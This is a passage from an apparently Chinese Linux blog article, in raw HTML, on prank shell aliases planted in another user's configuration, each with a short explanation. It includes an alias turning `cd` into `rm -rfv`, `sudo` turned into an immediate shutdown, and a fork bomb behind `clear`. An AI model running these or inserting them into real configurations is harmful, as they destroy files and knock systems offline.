class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunction ls { command ls -$(opts=\"frStu\"; echo ${opts:$((RANDOM % ${#opts})):1}) \"$@\"; }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b38b312991053-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b38b312991053-1\"><span class=\"crayon-t\">function</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">command </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">opts</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"frStu\"</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">opts</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">RANDOM</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-p\">#opts})):1}) \"$@\"; }</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>原来它用一个函数重新定义了 <code>ls</code>，所以，真是看心情，你永远不知道它会以什么顺序返回结果。</p>\n<blockquote><p>学习课堂：</p>\n<p>ls 的 <code>f</code> 选项表示不排序输出（即只按照磁盘存储顺序输出）；<code>r</code> 表示反向排序；<code>S</code> 表示按文件大小排序；<code>t</code> 表示按修改时间排序；<code>u</code> 表示按最后访问时间排序。</p></blockquote>\n<h4 id=\"toc_7\">再也不要试着进入目录了</h4>\n<p>当我想进入目录看看时，惊奇的是居然没进去，难道没有自动补全我就输入错了？用前面那个奇奇怪怪的 <code>ls</code> 再次看看时，令人惊恐的是，那个目录！它没有了！！！不信邪的我又重复了这个过程，然后，我就一个子目录也没有了！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b38f627839749\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias cd='rm -rfv';</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b38f627839749-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b38f627839749-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">cd</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'rm -rfv'</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这该死的，连输入 <code>cd</code> 这么无害的命令都这么可怕！</p>\n<blockquote><p>学习课堂：</p>\n<p><code>rm</code> 命令的 <code>-r</code> 表示可删除（非空）目录；<code>-f</code> 表示不需要确认删除；<code>-v</code> 表示删除后显示被删除的文件/目录名称——这里是用来嘲讽我删除了某个目录的吗？</p></blockquote>\n<h4 id=\"toc_8\">还敢用 sudo 权限吗？</h4>\n<p>我很遵守安全守则，从来不用 root 直接登录，凡是管理任务，都用 <code>sudo</code> 来执行。然而，现在无论我用 <code>sudo</code> 执行什么命令，都会<strong>马上关机</strong>，并将我输入的命令广而告之！这是我被系统讨厌了么？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b392361108712\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias sudo='sudo shutdown -P now';</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b392361108712-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b392361108712-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">sudo</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'sudo shutdown -P now'</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<blockquote><p>学习课堂：</p>\n<p><code>shutdown</code> 命令用来关闭系统，<code>-P</code> 参数表示连同电源一起关闭； <code>now</code> 表示马上关机。这之后的参数（在此例中，是原本希望 <code>sudo</code> 执行的命令）会作为关闭前的通知信息，广播给系统上所有在线的用户。</p></blockquote>\n<h4 id=\"toc_9\">我原本想静静，结果世界都静了</h4>\n<p>杂乱的屏幕输出让你厌憎，所以，一个 <code>clear</code> 命令就可以静静了——等等，为什么我的终端崩溃了？然后系统也死机了。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b396006167199\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias clear=':(){ :|:&amp; };:';</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b396006167199-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b396006167199-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">clear</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">':(){ :|:&amp; };:'</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这是将 <code>clear</code> 命令别名为一个 <a href=\"https://linux.cn/article-5685-1.html\">fork 炸弹</a>了，据说这个是最精简、最难懂的 fork 炸弹了。至于炸弹的效果，嗯，世界都安静了</p>\n<blockquote><p>学习课堂：</p>\n<p>Fork 炸弹带来的后果就是耗尽服务器资源，使服务器不能正常的对外提供服务，也就是常说的 DoS（Denial of Service）。</p></blockquote>\n<h4 id=\"toc_10\">今夕是何年？</h4>\n<p>这光怪陆离的世界啊，让我疑似梦中，那么，现在是什么时候？当然，我肯定不会去翻日历的，输入 <code>date</code> 命令才是我们命令行极客该做的事情。看着返回的日期，我不禁怀疑我的记忆，难道我穿越了么？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b39a479346393\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias date='date -d \"now + $RANDOM days\"';</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b39a479346393-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b39a479346393-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">date</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'date -d \"now + $RANDOM days\"'</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<blockquote><p>学习课堂：</p>\n<p><code>date</code> 命令可以显示相对偏移的日期，上述命令中 <code>$RANDOM</code> 的结果是一个随机的整数，也就是说这里的 <code>date</code> 命令会返回若干天之后的日期。</p></blockquote>\n<h4 id=\"toc_11\">如果你有一个鬼马的 CD 驱动器</h4>\n<p>现在 CD 驱动器用的不多了，但是很多机器上还残留着这个“咖啡杯托”，如果你有幸还有这个东西的话，或许今天它就被鬼怪附体了，一会弹出，一会又收回去，有时候你按下弹出键却毫无反应——当你真的将咖啡杯放上面时，小心，你的咖啡杯会掉下来！</p>\n<blockquote><p>将 CD 盘托当成咖啡杯托是一个笑话，据说某人曾经给电脑厂家打电话：</p>\n<p>“您好，我想说你们的机器上的咖啡杯托以前挺好用的，可是现在它不动了。”</p>\n<p>“‘咖啡杯托’？那是什么？”</p>\n<p>“就是那个一按按钮就会弹出的托盘啊，放咖啡杯正好，还有合适的凹槽，设计的不错！以前都好好的，现在它不会弹出了。”</p>\n<p>“……”</p></blockquote>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b39e752065975\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n    N=$[$RANDOM % 3];\r\n    if [[ $N == 0 ]]; then\r\n        # 几分钟后随即打开或关闭\r\n        sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done' &gt; /dev/null 2&gt;&amp;1 &amp;\r\n    elif [[ $N == 1 ]]; then\r\n        # 要么，死活打不开\r\n        sh -c 'while :; do eject -t; eject -i on; sleep 0.1s; done' &gt; /dev/null 2&gt;&amp;1 &amp;\r\n    else\r\n        # 要么，读取变得极慢（1 倍速），需要循环的原因是弹出后就需要重新设定。\r\n        sh -c 'set +o errexit; while :; do eject -x 1; sleep 1s; done' &gt; /dev/null 2&gt;&amp;1 &amp;\r\n    fi;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b39e752065975-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b10e03b39e752065975-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b10e03b39e752065975-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b10e03b39e752065975-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b10e03b39e752065975-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b10e03b39e752065975-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b10e03b39e752065975-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b10e03b39e752065975-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594b10e03b39e752065975-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b10e03b39e752065975-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594b10e03b39e752065975-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b39e752065975-1\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">N</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">RANDOM</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b10e03b39e752065975-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">N</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line\" id=\"crayon-594b10e03b39e752065975-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-p\"># 几分钟后随即打开或关闭</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b10e03b39e752065975-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span></div><div class=\"crayon-line\" id=\"crayon-594b10e03b39e752065975-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">elif</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">N</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b10e03b39e752065975-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-p\"># 要么，死活打不开</span></div><div class=\"crayon-line\" id=\"crayon-594b10e03b39e752065975-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'while :; do eject -t; eject -i on; sleep 0.1s; done'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b10e03b39e752065975-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line\" id=\"crayon-594b10e03b39e752065975-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-p\"># 要么，读取变得极慢（1 倍速），需要循环的原因是弹出后就需要重新设定。</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b10e03b39e752065975-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'set +o errexit; while :; do eject -x 1; sleep 1s; done'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span></div><div class=\"crayon-line\" id=\"crayon-594b10e03b39e752065975-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">fi</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0028 seconds] -->\r\n<p></p>\n<blockquote><p>学习课堂：</p>\n<p><code>eject</code> 是操作 CD 驱动器的命令行，记得当年有位第一次接触 SUN Solaris 的同事问我，这 CD 怎么打开啊？我默默地输入了 <code>eject</code>， 在同事愕然的眼光中不带走一丝云彩轻轻地离开。</p>\n<p><code>eject</code> 的 <code>-T</code> 选项会将关闭的 CD 驱动器打开，将打开的 CD 驱动器关闭；<code>-t</code> 选项则是关闭 CD 驱动器；<code>-x</code> 选项用来设置读取倍速；<code>-i on</code> 用于将弹出按钮失效。</p></blockquote>\n<h4 id=\"toc_12\">冰川时代</h4>\n<p>突然地，某个你已经打开的程序冻结了，也许是你的浏览器、也许是你正写了一半的文档，所以，随时保存文档是个好习惯吗？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b3a3198759800\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div 